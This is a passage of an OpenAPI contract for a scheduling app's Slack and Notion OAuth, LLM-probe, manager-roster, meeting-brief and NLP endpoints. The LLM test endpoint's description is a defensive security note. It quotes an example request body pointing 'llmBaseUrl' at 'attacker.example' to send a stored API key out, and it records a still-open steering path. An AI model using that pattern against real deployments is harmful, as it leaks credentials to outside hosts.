                $ref: '#/components/schemas/IntegrationAvailabilityResponse'
  /api/integrations/notion:
    delete:
      operationId: disconnectNotion
      tags:
      - integrations
      summary: Delete the stored Notion connection
      description: Idempotent. The storage error is discarded, so this is always 204.
      responses:
        '204':
          description: Disconnected. Empty body.
        '401':
          $ref: '#/components/responses/Unauthorized'
  /api/integrations/notion/callback:
    get:
      operationId: notionOauthCallback
      tags:
      - integrations
      summary: Notion OAuth redirect target (redirect)
      description: 'Validates `state` against the `notion_oauth_state` cookie, exchanges `code` at

        `https://api.notion.com/v1/oauth/token` (HTTP Basic with client id/secret),

        upserts the connection and 302-redirects into the SPA.

        The stored connection has no bot token and no scopes (Notion returns none here).

        '
      parameters:
      - name: code
        in: query
        required: false
        description: Notion's authorization code. Presence is not checked by the handler; a missing code
          surfaces as a 502.
        schema:
          type: string
      - name: state
        in: query
        required: true
        description: Must equal the `notion_oauth_state` cookie value exactly.
        schema:
          type: string
      responses:
        '302':
          description: Connection stored; redirect back into the app.
          headers:
            Location:
              description: Always the literal `/app/settings?tab=integrations&notion=connected`.
              schema:
                type: string
        '400':
          description: Cookie missing or state mismatch. PLAIN TEXT "invalid state".
          content:
            text/plain:
              schema:
                type: string
        '401':
          $ref: '#/components/responses/Unauthorized'
        '500':
          description: PLAIN TEXT "db error" — the upsert failed.
          content:
            text/plain:
              schema:
                type: string
        '502':
          description: 'PLAIN TEXT "token exchange failed: " plus the error (transport error, unparseable
            JSON, or a non-empty `error` field from Notion).'
          content:
            text/plain:
              schema:
                type: string
  /api/integrations/notion/connect:
    get:
      operationId: connectNotion
      tags:
      - integrations
      summary: Begin the Notion OAuth flow (redirect)
      description: 'Sets an HttpOnly `notion_oauth_state` cookie (Path=/, Max-Age=300) and 302-redirects

        to Notion. Browser navigation endpoint, no body. Unlike Slack, no `scope` is

        requested — the query carries `response_type=code` and `owner=user`.

        '
      responses:
        '302':
          description: Redirect to Notion's authorize page.
          headers:
            Location:
              description: '`https://api.notion.com/v1/oauth/authorize?client_id=…&redirect_uri=…&response_type=code&owner=user&state=…`'
              schema:
                type: string
                format: uri
            Set-Cookie:
              description: '`notion_oauth_state=<random>; Path=/; Max-Age=300; HttpOnly`'
              schema:
                type: string
        '401':
          $ref: '#/components/responses/Unauthorized'
        '503':
          description: '`NOTION_CLIENT_ID` is unset. PLAIN TEXT body "Notion not configured".'
          content:
            text/plain:
              schema:
                type: string
  /api/integrations/notion/status:
    get:
      operationId: getNotionStatus
      tags:
      - integrations
      summary: Whether Notion is connected for this user
      description: 'Always 200. Any storage error collapses into `{"connected": false}` with no `workspace_name`
        key.'
      responses:
        '200':
          description: Connection status.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/IntegrationStatus'
        '401':
          $ref: '#/components/responses/Unauthorized'
  /api/integrations/slack:
    delete:
      operationId: disconnectSlack
      tags:
      - integrations
      summary: Delete the stored Slack connection
      description: 'Deletes the `workspace_connections` row for (user, "slack"). The storage error is

        explicitly discarded, so a failed delete is still reported as 204. Deleting a

        connection that does not exist is also 204 — this endpoint is idempotent and

        never reports 404.

        '
      responses:
        '204':
          description: Disconnected. Empty body.
        '401':
          $ref: '#/components/responses/Unauthorized'
  /api/integrations/slack/callback:
    get:
      operationId: slackOauthCallback
      tags:
      - integrations
      summary: Slack OAuth redirect target (redirect)
      description: 'Validates the `state` query value against the `slack_oauth_state` cookie, exchanges

        `code` at `https://slack.com/api/oauth.v2.access`, upserts the workspace connection

        and 302-redirects into the SPA. Never returns JSON on success.

        '
      parameters:
      - name: code
        in: query
        required: false
        description: 'Slack''s authorization code. Marked optional because the handler does not check

          for its presence — a missing code is forwarded to Slack and surfaces as a 502.

          '
        schema:
          type: string
      - name: state
        in: query
        required: true
        description: Must equal the `slack_oauth_state` cookie value exactly.
        schema:
          type: string
      responses:
        '302':
          description: Connection stored; redirect back into the app.
          headers:
            Location:
              description: Always the literal `/app/settings?tab=integrations&slack=connected`.
              schema:
                type: string
        '400':
          description: Cookie missing or state mismatch. PLAIN TEXT "invalid state".
          content:
            text/plain:
              schema:
                type: string
        '401':
          $ref: '#/components/responses/Unauthorized'
        '500':
          description: PLAIN TEXT "db error" — the upsert failed.
          content:
            text/plain:
              schema:
                type: string
        '502':
          description: 'PLAIN TEXT "token exchange failed: " plus the error (transport error, unparseable
            JSON, or Slack''s `error` string when `ok:false`).'
          content:
            text/plain:
              schema:
                type: string
  /api/integrations/slack/connect:
    get:
      operationId: connectSlack
      tags:
      - integrations
      summary: Begin the Slack OAuth flow (redirect)
      description: 'Sets an HttpOnly `slack_oauth_state` cookie (Path=/, Max-Age=300) and 302-redirects

        to Slack. This is a browser navigation endpoint, not a JSON API: it returns no body.

        Requested scopes: `search:read,users:read,channels:read,chat:write`; user_scope `search:read`.

        Note this route sits inside the authenticated group, so the browser must already

        carry the `auth_token` cookie when it navigates here.

        '
      responses:
        '302':
          description: Redirect to Slack's authorize page.
          headers:
            Location:
              description: '`https://slack.com/oauth/v2/authorize?client_id=…&redirect_uri=…&scope=…&user_scope=search%3Aread&state=…`'
              schema:
                type: string
                format: uri
            Set-Cookie:
              description: '`slack_oauth_state=<random>; Path=/; Max-Age=300; HttpOnly`'
              schema:
                type: string
        '401':
          $ref: '#/components/responses/Unauthorized'
        '503':
          description: '`SLACK_CLIENT_ID` is unset. PLAIN TEXT body "Slack not configured".'
          content:
            text/plain:
              schema:
                type: string
  /api/integrations/slack/status:
    get:
      operationId: getSlackStatus
      tags:
      - integrations
      summary: Whether Slack is connected for this user
      description: 'Always 200. Any storage error (including "no row") is collapsed into

        `{"connected": false}` — the `workspace_name` key is then absent entirely.

        '
      responses:
        '200':
          description: Connection status.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/IntegrationStatus'
        '401':
          $ref: '#/components/responses/Unauthorized'
  /api/llm/test:
    post:
      operationId: testLLMConnection
      tags:
      - llm
      summary: Probe an LLM provider configuration
      description: 'Probes a provider configuration by issuing a fixed completion (system "You are a helpful
        assistant.", user "Say hello").

        PAC-24 resolves API-037. **THE DESTINATION IS NEVER SUPPLIED BY THE CALLER.** Every value that
        contributes to the URL this server requests — `llmBaseUrl`, `ollamaBaseUrl`, `azureEndpoint`,
        `azureDeployment`, `azureApiVersion`, `awsRegion`, `awsProfile`, `bedrockModel`, `gcpProject`,
        `gcpLocation`, `vertexModel` — is read from the CALLER''S OWN stored settings and from nowhere
        else. The request body may carry only `llmProvider`, `llmModel` and `llmApiKey`, none of which
        reaches a URL (`backend/nlp/llm_factory.go:13-58`: `llmModel` is consulted only by the `openai`
        and `anthropic` branches, where it is a JSON body field, and `llmApiKey` only as an `Authorization`
        header value).

        This is a security property of the contract, not a convenience, and the invariant is: **a credential
        the caller did not supply is never sent to a destination the caller did supply — because the caller
        cannot supply a destination at all.** An earlier draft of this contract let a body override each
        endpoint property individually with per-property fallback to the stored values. That let `{"llmProvider":"openai","llmBaseUrl":"https://attacker.example"}`
        pair a caller-chosen host with the stored key: `nlp.NewLLMClientFromSettings` builds `OpenAIClient{APIKey:
        s.LLMAPIKey, BaseURL: s.LLMBaseURL}` (`backend/nlp/llm_factory.go:29`) and `OpenAIClient.Complete`
        POSTs to `base + "/v1/chat/completions"` with `Authorization: Bearer <key>` (`backend/nlp/parser.go:31,43`),
        so the stored key would leave the deployment and the 200/502 would confirm delivery. An all-or-nothing
        body (supply the endpoint AND the key together) does not close it either: on the `azure_openai`,
        `bedrock` and `vertex` branches the credential is AMBIENT and cannot be submitted — `AzureOpenAIClient.Complete`
        mints a token with `azidentity.NewDefaultAzureCredential` and sends it as `Authorization: Bearer
        <token>` to `c.Endpoint` (`backend/nlp/llm_azure_openai.go:28-50`) — so any submitted endpoint
        is necessarily paired with a credential the caller did not supply. Refusing submitted destinations
        outright is the only shape that holds for all six providers.

        What the body IS for: verifying a key that has not been saved, now that a stored key can never
        be read back (see `SettingsFields.llmApiKey`), and naming which provider the result is about (spec
        AC-15). An absent body, or `{}`, probes the caller''s stored configuration entirely — the pre-PAC-24
        behaviour.

        Before PAC-24 the handler never read r.Body at all and always probed the SINGLETON settings row,
        so this operation reported on the deployment''s saved configuration rather than on the caller''s
        (API-002, API-037).

        No response on any status carries the submitted or the stored `llmApiKey`. The provider''s own
        error text is still echoed on 502 — that is API-054 / T8 and is NOT resolved here; the narrower
        guarantee PAC-24 adds is that the key itself never appears (spec AC-14).

        NOT resolved here, and recorded rather than silently fixed (factory §7): a caller can still steer
        this probe indirectly by first writing `llmBaseUrl` or `azureEndpoint` into their OWN settings
        via `PATCH /api/settings` and then probing. That path exists today via the pre-PAC-24 `PUT /api/settings`
        plus this operation, PAC-24 neither opens nor closes it (the write is now `PATCH`), and on the
        ambient-credential providers it reaches a deployment-wide cloud identity rather than the caller''s
        own key. It needs its own issue (allow-listing or scheme/host restriction on the endpoint properties);
        see `contracts/features/PAC-24.md` §2.

        '
      requestBody:
        required: false
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/LLMTestRequest'
      responses:
        '200':
          description: Provider reachable.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/LLMTestResult'
        '400':
          description: 'Malformed JSON body; a body naming an `llmProvider` outside the permitted set;
            or a body carrying any property other than `llmProvider`, `llmModel` and `llmApiKey` (`additionalProperties:
            false`). The last case is how a caller attempting to supply a destination - `llmBaseUrl`,
            `azureEndpoint`, `ollamaBaseUrl`, … - is refused, and it must be refused here rather than
            ignored, so that a client is told its override did nothing instead of being left to believe
            it probed what it named. JSON error shape (writeError). The response never contains the submitted
            or the stored `llmApiKey` (spec AC-14).

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/SchedulingErrorResponse'
        '500':
          description: 'Two different encodings share this code. Settings load failure -> text/plain (http.Error).
            Client construction failure (e.g. `LLM not configured - set API key in Settings`) -> JSON
            error shape (writeError).

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/SchedulingErrorResponse'
            text/plain:
              schema:
                type: string
        '502':
          description: 'The provider call failed. JSON error shape (writeError) carrying the upstream
            error string.

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/SchedulingErrorResponse'
  /api/manager/analytics:
    get:
      operationId: getManagerAnalytics
      tags:
      - manager
      summary: Twelve weeks of per-member focus/meeting/free minutes.
      description: 'Returns exactly 12 week buckets per member (months=3 is hard-coded and numWeeks =
        months*4), ordered NEWEST FIRST: weeks[0].week_start == the resolved `week`, each subsequent entry
        is 7 days earlier. A member with no data still gets 12 buckets of zeroes with data_available=false.
        `members` is always an array, never null.

        '
      parameters:
      - $ref: '#/components/parameters/OptionalTeamIdQuery'
      - name: week
        in: query
        required: false
        description: Monday of the newest week, YYYY-MM-DD. Defaults to the current UTC ISO week's Monday.
        schema:
          type: string
          format: date
      responses:
        '200':
          description: Per-member weekly analytics.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ManagerAnalytics'
        '400':
          description: JSON error — "team_id must be a valid UUID" or "week must be YYYY-MM-DD".
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '500':
          $ref: '#/components/responses/PlainTextServerError'
  /api/manager/detect:
    post:
      operationId: previewManagerDetection
      tags:
      - manager
      summary: Preview detected 1:1 candidates for a team. Assigns nothing.
      description: 'PREVIEW half of the preview-then-confirm flow. Runs DetectTeam (which does write the
        global manager_team_members identity rows and one_on_one_occurrences as a side effect of scanning
        the calendar) and then reports, per candidate, whether that email is ALREADY assigned to the selected
        team. `assigned` is hard-coded to 0: this endpoint never creates a manager_team_member_assignments
        row for any team. `team_id` is REQUIRED here and the caller must be the team OWNER.

        '
      parameters:
      - $ref: '#/components/parameters/RequiredTeamIdQuery'
      requestBody:
        required: false
        description: Body is ignored entirely.
        content:
          application/json:
            schema:
              type: object
      responses:
        '200':
          description: Detection preview.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ScanPreview'
        '400':
          description: 'JSON error. "team_id is required" when the query param is absent or blank; "team_id
            must be a valid UUID" when unparseable.

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '500':
          description: 'text/plain. Either "detection error: <wrapped engine error>" (calendar/OAuth failure)
            or "db error" from the per-candidate assignment lookup.

            '
          content:
            text/plain:
              schema:
                type: string
  /api/manager/detect/confirm:
    post:
      operationId: confirmManagerDetection
      tags:
      - manager
      summary: Explicitly assign selected candidate emails to one team.
      description: 'CONFIRM half of the preview-then-confirm flow. The only endpoint that creates manager_team_member_assignments
        rows from detection. Runs in a single transaction (storage.ConfirmManagerTeamMembers) and is idempotent:
        a second confirm of the same email counts as skipped, not assigned. Emails are lowercased/trimmed
        by the handler before storage sees them. The request decoder uses DisallowUnknownFields, so any
        field other than `emails` yields 400 "invalid JSON".

        '
      parameters:
      - $ref: '#/components/parameters/RequiredTeamIdQuery'
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/ScanConfirmRequest'
      responses:
        '200':
          description: Assignment counts. `total` is the post-commit assignment count for this team.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ScanConfirmation'
        '400':
          description: 'JSON error. "team_id is required", "team_id must be a valid UUID", or "invalid
            JSON" (malformed body OR an unknown field, via DisallowUnknownFields).

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '422':
          description: 'JSON error. "emails is required" when the key is absent or JSON null (an empty
            array is accepted and returns assigned=0, skipped=0); "email is required" for a blank entry;
            "email must be a valid email address" for an unparseable entry.

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '500':
          $ref: '#/components/responses/PlainTextServerError'
  /api/manager/gaps:
    get:
      operationId: getManagerCadenceGaps
      tags:
      - manager
      summary: Members whose 1:1 cadence is overdue or due within 7 days.
      description: 'The engine always computes gaps over the manager''s GLOBAL roster; when `team_id`
        is supplied the handler post-filters that list to emails present in the team-scoped roster (case-insensitive).
        Members with cadence="none" never appear. A member with a recorded 1:1 occurrence in the next
        14 days is suppressed. Sorted by days_overdue descending. `gaps` is always an array, never null.

        '
      parameters:
      - $ref: '#/components/parameters/OptionalTeamIdQuery'
      responses:
        '200':
          description: Cadence gaps.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/CadenceGapList'
        '400':
          description: JSON error — "team_id must be a valid UUID".
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '500':
          description: 'text/plain — "gap detection error: <err>" or "db error".'
          content:
            text/plain:
              schema:
                type: string
  /api/manager/profile:
    get:
      operationId: getManagerProfile
      tags:
      - manager
      summary: Manager flag, detection timestamp and global roster size.
      description: 'Not team-scoped. `team_member_count` counts rows in manager_team_members for the caller
        (the global identity table), not assignments to any one formal team.

        '
      responses:
        '200':
          description: Manager profile summary.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ManagerProfileSummary'
        '500':
          $ref: '#/components/responses/PlainTextServerError'
    post:
      operationId: setManagerProfile
      tags:
      - manager
      summary: Set the caller's is_manager flag; may trigger background detection.
      description: 'When `is_manager` is true and the profile has no `detected_at` yet, the handler spawns
        a background goroutine running DetectTeam with a 30s timeout. That background run persists detected
        members into the GLOBAL manager_team_members table only; it never creates team assignments. The
        response is written before the goroutine completes.

        '
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/ManagerProfileUpdate'
      responses:
        '200':
          description: 'The persisted storage.UserProfile Go struct. That struct carries NO json tags,
            so encoding/json emits Go field names in PascalCase. This is inconsistent with the snake_case
            GET response on the same path.

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/UserProfileGoStruct'
        '400':
          $ref: '#/components/responses/JsonError'
        '500':
          $ref: '#/components/responses/PlainTextServerError'
  /api/manager/team:
    get:
      operationId: getManagerRoster
      tags:
      - manager
      summary: Team-scoped manager roster with this-week / last-week stats.
      description: '`team_id` is REQUIRED (unlike the member-mutation routes below), and membership —
        not ownership — suffices. The roster is the union of (a) manager assignments for this team and
        (b) formal team_members of this team that have no assignment yet, synthesised with source="formal"
        and cadence="none". The caller is always excluded from (b). Sorted case-insensitively by display_name.
        `members` is always an array, never null.

        '
      parameters:
      - $ref: '#/components/parameters/RequiredTeamIdQuery'
      - name: week
        in: query
        required: false
        description: 'Monday of the target week, YYYY-MM-DD, parsed as UTC midnight. Defaults to the current
          ISO week''s Monday in UTC. Not validated to actually be a Monday.

          '
        schema:
          type: string
          format: date
      responses:
        '200':
          description: Manager roster.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ManagerRoster'
        '400':
          description: 'JSON error. "team_id is required", "team_id must be a valid UUID", or "week must
            be YYYY-MM-DD".

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '500':
          $ref: '#/components/responses/PlainTextServerError'
  /api/manager/team/members:
    post:
      operationId: addManagerTeamMember
      tags:
      - manager
      summary: Add or upsert a roster member, optionally scoped to a team.
      description: '`team_id` is OPTIONAL here. Without it the member is written to the global manager_team_members
        table only. With it the write is transactional across manager_team_members plus manager_team_member_assignments,
        and the caller must be the team OWNER. Adding a member never creates a team_invites row (asserted
        by TestManagerTeam_AddMemberCreatesOnlySelectedTeamAssignment).

        '
      parameters:
      - $ref: '#/components/parameters/OptionalTeamIdQuery'
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/AddManagerMemberRequest'
      responses:
        '201':
          description: 'The in-memory storage.ManagerTeamMember Go struct. It has NO json tags, so the
            body is PascalCase and its `ID`/`CreatedAt`/`UpdatedAt` are the Go zero values (all-zero UUID,
            "0001-01-01T00:00:00Z") because the upsert does not read the row back. Clients must re-fetch
            the roster instead of using this body.

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ManagerTeamMemberGoStruct'
        '400':
          description: JSON error — "team_id must be a valid UUID" or "invalid JSON".
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '422':
          description: 'JSON error. "email is required"; "email must be a valid email address"; "cadence
            must be weekly, biweekly, monthly, custom, or none"; "custom_cadence_days must be between
            1 and 365"; "custom_cadence_days is only valid with custom cadence".

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '500':
          $ref: '#/components/responses/PlainTextServerError'
  /api/manager/team/members/{email}:
    parameters:
    - $ref: '#/components/parameters/MemberEmailPath'
    delete:
      operationId: removeManagerTeamMember
      tags:
      - manager
      summary: Remove a member globally, or unassign them from one team.
      description: 'Without `team_id`: deletes the global manager_team_members row outright. With `team_id`
        (owner required): removes the formal team_members row if the email maps to a Paceday user, deletes
        the manager assignment for this team only, deletes pending team_invites for this email on this
        team, and LEAVES the global manager_team_members identity row and its 1:1 history intact. Every
        storage error on this path is swallowed, so a failed delete still returns 204.

        '
      parameters:
      - $ref: '#/components/parameters/OptionalTeamIdQuery'
      responses:
        '204':
          description: Deleted (or silently no-op). Empty body.
        '400':
          description: JSON error — "team_id must be a valid UUID".
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '422':
          description: JSON error — "the team owner cannot be removed".
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
    patch:
      operationId: patchManagerTeamMember
      tags:
      - manager
      summary: Update display name and/or cadence for a roster member.
      description: 'Omitted fields keep their current value. Supplying `cadence` as anything other than
        "custom" clears cadence_custom_days; omitting `cadence` preserves it (TestManagerPatchMember_PreservesOmittedCustomDays).
        A blank display_name falls back to the local part of the email. With `team_id`, only team-scoped
        preferences change (display_name_override, cadence, cadence_custom_days on the assignment row);
        the canonical global display name is never overwritten. Also, with `team_id`, a formal team member
        with no assignment yet is materialised into an assignment on first patch.

        '
      parameters:
      - $ref: '#/components/parameters/OptionalTeamIdQuery'
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/PatchManagerMemberRequest'
      responses:
        '200':
          description: 'The re-read storage.ManagerTeamMember, PascalCase (no json tags). The read error
            is discarded, so this body can legitimately be the JSON literal `null` when the re-read fails.

            '
          content:
            application/json:
              schema:
                oneOf:
                - $ref: '#/components/schemas/ManagerTeamMemberGoStruct'
                - type: 'null'
        '400':
          description: JSON error — "team_id must be a valid UUID" or "invalid JSON".
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '404':
          description: text/plain "not found" — no such member in scope.
          content:
            text/plain:
              schema:
                type: string
        '422':
          description: JSON error — cadence validation, same messages as addManagerTeamMember.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '500':
          $ref: '#/components/responses/PlainTextServerError'
  /api/manager/team/members/{email}/schedule:
    post:
      operationId: scheduleManagerOneOnOne
      tags:
      - manager
      summary: Build a server-side /app prefill URL for a 1:1 with this member.
      description: 'Creates nothing on any calendar. Returns a relative URL of the form `/app?attendees=<email>&duration=30&title=1%3A1+with+<display_name>`
        plus `&date=<suggested_date>` when supplied (query params are Go url.Values-encoded, so alphabetically
        ordered). An empty body is accepted (io.EOF is tolerated).

        '
      parameters:
      - $ref: '#/components/parameters/OptionalTeamIdQuery'
      requestBody:
        required: false
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/ScheduleOneOnOneRequest'
      responses:
        '200':
          description: Prefill URL.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/PrefillUrlResponse'
        '400':
          description: JSON error — "team_id must be a valid UUID" or "invalid JSON".
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '403':
          $ref: '#/components/responses/JsonForbidden'
        '404':
          description: text/plain "not found".
          content:
            text/plain:
              schema:
                type: string
        '422':
          description: JSON error — "suggested_date must be YYYY-MM-DD".
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
        '500':
          $ref: '#/components/responses/PlainTextServerError'
  /api/meetings/{event_id}/brief:
    parameters:
    - $ref: '#/components/parameters/EventId'
    get:
      operationId: getMeetingBrief
      tags:
      - meeting-briefs
      summary: Read the cached Slack/Notion brief for a meeting
      description: 'Pure read — it never triggers generation. When no brief row exists the handler

        returns 200 (not 404) with `{"status":"pending","sources":{"slack":[],"notion":[]}}`

        and no `generated_at` / `brief_text`.

        '
      responses:
        '200':
          description: The brief, or a synthetic `pending` placeholder when none is stored.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/MeetingBriefResponse'
        '400':
          description: '"event_id required" as PLAIN TEXT (written via `http.Error`, so

            `Content-Type: text/plain; charset=utf-8`, not the JSON error shape).

            '
          content:
            text/plain:
              schema:
                type: string
          x-uncertain: 'Believed unreachable: chi never matches an empty {event_id} segment, so this branch
            cannot fire through the router.'
        '401':
          $ref: '#/components/responses/Unauthorized'
        '500':
          description: '"db error" as PLAIN TEXT via `http.Error` — not the JSON error shape.'
          content:
            text/plain:
              schema:
                type: string
  /api/meetings/{event_id}/brief/refresh:
    parameters:
    - $ref: '#/components/parameters/EventId'
    post:
      operationId: refreshMeetingBrief
      tags:
      - meeting-briefs
      summary: Force-regenerate a meeting brief
      description: 'Synchronous and slow — bounded by a 60s server-side context timeout. Calls

        `MeetingBriefService.Generate(..., force=true)`, which searches Slack and Notion

        and (when an LLM is configured in settings) writes `brief_text`.

        The handler builds a stub `calendar.Event{Id: event_id}` rather than fetching the

        real event, so the brief''s search terms come from the stored/derived context only.

        The request body is never read.

        The returned `status` is "ready" on success and "failed" when the source fetch or

        LLM step failed — a "failed" brief is still returned with HTTP 200.

        '
      responses:
        '200':
          description: The regenerated brief.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/MeetingBriefResponse'
        '400':
          description: '"event_id required" as PLAIN TEXT. Believed unreachable via chi routing.'
          content:
            text/plain:
              schema:
                type: string
        '401':
          $ref: '#/components/responses/Unauthorized'
        '500':
          description: 'PLAIN TEXT "generation error: " plus the underlying error.'
          content:
            text/plain:
              schema:
                type: string
  /api/nlp/confirm:
    post:
      operationId: confirmNaturalLanguage
      tags:
      - nlp
      summary: Create the meeting for a chosen parsed slot
      description: 'The whole ParseResult from /api/nlp/parse is echoed back. Only `title`, `attendees`,
        `constraints` (mapped to the event Description) and `suggested_slots[selected_slot_index]` are
        used; `duration_minutes`, `range_start`, `range_end`, `preferred_times` and `avoid_times` are
        ignored here. On success an audit row `nlp_confirmed` is written and the raw Google Calendar event
        is returned.

        '
      x-uncertain: 'The bounds check is `len(SuggestedSlots) == 0 || SelectedSlotIndex >= len(...)`. A
        NEGATIVE `selected_slot_index` passes validation and then indexes the slice out of range, which
        panics. The panic is re-raised by sentryMiddleware and becomes a generic 500 from net/http - it
        is not a 400. A human should confirm whether this is intended before the spec documents a 400
        for negative indexes.

        '
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/NLPConfirmRequest'
      responses:
        '200':
          description: The created Google Calendar event.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/GoogleCalendarEvent'
        '400':
          description: '`invalid JSON`, or `invalid selected_slot_index` (empty slot list, or index >=
            len). JSON error shape (writeError).

            '
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/SchedulingErrorResponse'
        '500':
          description: 'CreateMeeting error as text/plain (http.Error), or an empty-body panic-derived
            500 for a negative index (see x-uncertain).

            '
          content:
            text/plain:
              schema:
                type: string
  /api/nlp/parse:
    post:
      operationId: parseNaturalLanguage
      tags:
      - nlp
      summary: Parse a natural-language scheduling request
      description: 'A malformed body and an empty `text` are collapsed into the same 400 (`missing text
        field`). Note that LLM-level failures inside the parser do NOT surface as 5xx: the parser returns
        `{"intent":"unknown","error":"..."}` with HTTP 200. A 500 only occurs when Parse() itself returns
        a non-nil error.

        '
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/NLPParseRequest'
      responses:
        '200':
          description: Parse result.
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/NLPParseResult'
        '400':
          description: '`missing text field` - JSON error shape (writeError).'
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/SchedulingErrorResponse'
        '500':
          description: Parser error, raw Go error as text/plain (http.Error).
          content:
            text/plain:
              schema:
                type: string
  /api/org/members:
    get:
      operationId: listOrgMembers
      tags:
      - calendar
      summary: List users in the caller's organization
      description: Returns all `users` rows sharing the caller's `org_id`, ordered by `created_at` ascending.
        If the caller cannot be loaded, or has no `org_id`, the handler returns 200 with `[]` rather than
        an error.
      responses:
        '200':
          description: Org members, or `[]` when the caller has no organization. The `org` property is
            never populated by this endpoint — storage.GetOrgMembers does not hydrate it, so it is always
            omitted.
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: '#/components/schemas/OrgMember'
        '401':
          description: Body is the JSON literal `{"error":"unauthorized"}` but http.Error overwrites Content-Type
            with text/plain; charset=utf-8. Also reachable as MiddlewareUnauthorized.
          content:
            text/plain:
              schema:
                $ref: '#/components/schemas/MiddlewareUnauthorized'
        '500':
          description: Body is the JSON literal `{"error":"internal"}` served as text/plain; charset=utf-8
            (http.Error).
          content:
            text/plain:
              schema:
                $ref: '#/components/schemas/MiddlewareUnauthorized'
  /api/personal-calendars:
    get:
      operationId: listPersonalCalendars
      tags:
      - calendar
      summary: List the caller's personal calendars
      description: Rows from `personal_calendars` owned by the authenticated user, ordered by id ascending.
        Always an array, `[]` when empty.
      responses:
        '200':
          description: Personal calendars.
          content:
            application/json:
              schema:
                type: array
                items:
